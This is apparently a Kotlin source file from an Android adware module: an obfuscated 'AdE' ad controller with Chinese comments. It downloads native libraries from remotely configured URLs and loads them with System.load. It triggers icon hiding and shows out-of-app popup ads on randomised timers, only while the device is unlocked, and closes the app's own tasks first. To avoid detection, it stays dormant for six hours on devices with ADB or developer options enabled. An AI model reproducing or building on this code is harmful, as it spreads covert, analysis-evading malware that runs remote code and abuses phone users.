package cozy

import android.app.Application
import android.app.KeyguardManager
import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import com.cozy.serprosz.CozyWCaz
import com.ozop.impI.AppLifecycelListener
import com.ozop.impI.Constant
import com.ozop.impI.Core
import com.righteous.and.core.b.A1
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import lovely.Ppz
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object AdE {
    private var mContext: Application = Core.mApp

    @JvmStatic
    var isSAd = false //是否显示广告

    @JvmStatic
    var lastSAdTime = 0L //上一次显示广告的时间

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限
    private var screenOpenCheck = 1400L // 屏幕监测、延迟显示

    private var numHour = Core.getInt("ad_s_h_n")
    private var numDay = Core.getInt("ad_s_d_n")
    private var isCurDay = Core.getStr("ad_lcd")
    private var numJumps = Core.getInt("ac_njp")

    @JvmStatic
    var isLoadH = false //是否H5的so 加载成功
    private var tagL = "" //调用外弹 隐藏icon字符串
    private var tagO = "" //外弹字符串

    @JvmStatic
    var strBroadKey = "" // 广播的key
    private var fileName = ""// 文件开关名

    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒

    private var soUrlH5 = ""

    private var soUrlW = ""

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Core.saveInt("ac_njp", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        Core.pE("advertise_limit")
    }

    private fun sC() {
        Core.saveInt("ad_s_h_n", numHour)
        Core.saveInt("ad_s_d_n", numDay)
    }

    private fun isCurH(): Boolean {
        val s = Core.getStr("ad_lht")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Core.saveC("ad_lht", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Core.saveC("ad_lcd", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    @JvmStatic
    fun a2() {
        refreshAdmin()
        if (isTestUser()) {
            var time = Core.getStr("time_first")
            if (time.isBlank()) {
                time = System.currentTimeMillis().toString()
                Core.saveC("time_first", time)
            }
            if (System.currentTimeMillis() - time.toLong() < 60000 * 60 * 6) { // 6小时以内
                Core.pE("test_user")
                return
            } else {
                Core.pE("test_user_time_pass")
            }
        }
        mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
        File("${mContext.dataDir}/$fileName").mkdirs()
        t()
    }

    private var isCheckDev = true

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        val listStr = js.optString(Constant.K_W).split("-")
        tagL = listStr[0]
        tagO = listStr[1]
        strBroadKey = listStr[2]
        fileName = listStr[3]
        isCheckDev = js.optInt("winsome_s", 1) == 1
        AdCenter.setAdId(js.optString(Constant.K_ID_L))// 广告id
        val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        nHourShowMax = lt[2].toInt()
        nDayShowMax = lt[3].toInt()
        nTryMax = lt[4].toInt()
        timeDS = lt[5].toLong()
        timeDE = lt[6].toLong()
        checkTimeRandom = lt[7].toInt() * 1000
        screenOpenCheck = lt[8].toLong()

        val lSoU = js.optJSONArray("win_url_s")
        if (is64a()) {
            soUrlW = lSoU[0].toString()
            soUrlH5 = lSoU[2].toString()
        } else {
            soUrlW = lSoU[1].toString()
            soUrlH5 = lSoU[3].toString()
        }
    }

    private var lastS = ""
    private fun refreshAdmin() {
        val s = Core.getStr("cozy_configure_info")
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private fun t() {
        val parentFile = File("${mContext.filesDir}")
        val save = File(parentFile, "fileCore")
        FileDownLoad("").fileD(soUrlW, success = {
            action(save)
            acper()
        }, save)
    }

    private fun acper() {
        val parentFile = File("${mContext.filesDir}")
        handler.postDelayed({
            val hFile = File(parentFile, "fileSm")
            FileDownLoad("H5").fileD(soUrlH5, success = {
                loSo(hFile)
                handler.post {
                    try {
                        Ppz.b(mContext)
                        isLoadH = true
                    } catch (_: Throwable) {
                    }
                }
            }, hFile)
        }, 1000)
    }

    private fun action(file: File) {
        mMainScope.launch {
            Core.pE("test_s_dec")
            val time = System.currentTimeMillis()
            loSo(file)
            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
            Ppz.a0(tagL)
            if (isLi().not()) {
                AdCenter.loadAd()
            }
            delay(1000)
            while (true) {
                var t = cTime
                if (checkTimeRandom > 0) {
                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                }
                checkAd()
                delay(t)
                // 刷新配置
                refreshAdmin()
                openOneWorker()
                if (numJumps > nTryMax) {
                    Core.pE("pop_fail")
                    break
                }
            }
        }
    }

    private fun loSo(assetsName: File): Boolean {
        try {
            assetsName.setReadOnly()
            System.load(assetsName.absolutePath)
            return true
        } catch (_: Exception) {
        }
        return false
    }

    private fun is64a(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }

    @JvmStatic
    fun adLoadSuccess() {
        openJob()
    }

    @JvmStatic
    fun checkAdIsReadyAndGoNext() {
        if (AdCenter.isAdReady()) {
            jobTimer?.cancel()
            jobTimer = null
            openJob()
        }
    }

    private var jobTimer: Job? = null
    private var timJobStart = 0L

    @JvmStatic
    private fun openJob() {
        if (jobTimer != null && jobTimer?.isActive == true) return
        timJobStart = System.currentTimeMillis()
        Core.pE("advertise_done")
        jobTimer = mMainScope.launch {
            val del = tPer - (System.currentTimeMillis() - lastSAdTime)
            delay(del)
            Core.pE("advertise_times")
            if (l().not()) {
                while (l().not()) {
                    delay(screenOpenCheck)
                }
            }
            Core.pE("ad_light")
            delay(finishAc())
            sNumJump(numJumps + 1)
            Core.pE("ad_start")
            Ppz.a0(tagO)
            lastSAdTime = System.currentTimeMillis()
            delay(4000)
            checkAdIsReadyAndGoNext()
        }
    }

    // 新逻辑
    private fun checkAd() {
        if (isNetworkAvailable().not()) return
        if (isLi()) {
            Core.pE("ad_pass", "limit")
            return
        }
        Core.pE("ad_pass", "null")
        AdCenter.loadAd()
        if (System.currentTimeMillis() - timJobStart > 90000) {
            checkAdIsReadyAndGoNext()
        }
    }


    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    @JvmStatic
    fun finishAc(): Long {
        if (l().not()) return 0
        val l = A1.a1()
        if (l.isNotEmpty()) {
            ArrayList(l).forEach {
                it.finishAndRemoveTask()
            }
            return 900
        }
        return 0
    }

    private fun l(): Boolean {
        return (mContext.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (mContext.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    private var time = 0L

    @JvmStatic
    private fun openOneWorker() {
        if (System.currentTimeMillis() - time < 45000) return
        time = 0L
        val workManager = WorkManager.getInstance(mContext)
        workManager.cancelAllWork()
        val workRequest = OneTimeWorkRequest.Builder(CozyWCaz::class.java).build()
        workManager.enqueueUniqueWork(
            "work_phone_notification", ExistingWorkPolicy.REPLACE, workRequest
        )
    }

    private fun isTestUser(): Boolean {
        if (isCheckDev.not()) return false
        val s = Core.getStr("tes_u")
        val isOpen = isAdbEnabled(mContext) || isDevelopmentSettingsEnabled(mContext)
        if (isOpen && s.isBlank()) {
            Core.saveC("tes_u", "1")
        }
        return isOpen || s == "1"
    }

    private fun isAdbEnabled(context: Context): Boolean {
        try {
            val adbEnabled =
                Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0)
            return adbEnabled == 1
        } catch (e: java.lang.Exception) {
            return false
        }
    }

    /**
     * 检查开发者选项是否开启（不完全可靠）
     */
    private fun isDevelopmentSettingsEnabled(context: Context): Boolean {
        try {
            val devOptionsEnabled = Settings.Global.getInt(
                context.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
            )
            return devOptionsEnabled == 1
        } catch (e: java.lang.Exception) {
            return false
        }
    }
}